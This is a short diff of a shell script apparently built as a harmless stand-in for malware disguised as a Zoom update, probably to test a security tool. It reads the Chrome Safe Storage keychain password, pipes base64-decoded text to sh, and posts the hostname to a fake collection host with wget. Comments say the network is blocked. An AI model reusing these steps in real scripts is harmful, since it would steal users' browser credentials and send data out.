@@ -58,7 +58,7 @@ security find-generic-password -w -s "Chrome Safe Storage" 2>/dev/null
 echo ZWNobyBhZWdpcy10ZXN0LXN0YWdl | base64 -d | sh
 
 # 5. Send what it found home. Blocked: no network, and the host never resolves.
-wget -q -O /dev/null --post-data "host=$(hostname)" https://collect.zoom-support.invalid/upload
+wget -q -T 5 --tries=1 -O /dev/null --post-data "host=$(hostname)" https://collect.zoom-support.invalid/upload
 
 echo "Update complete."
 `
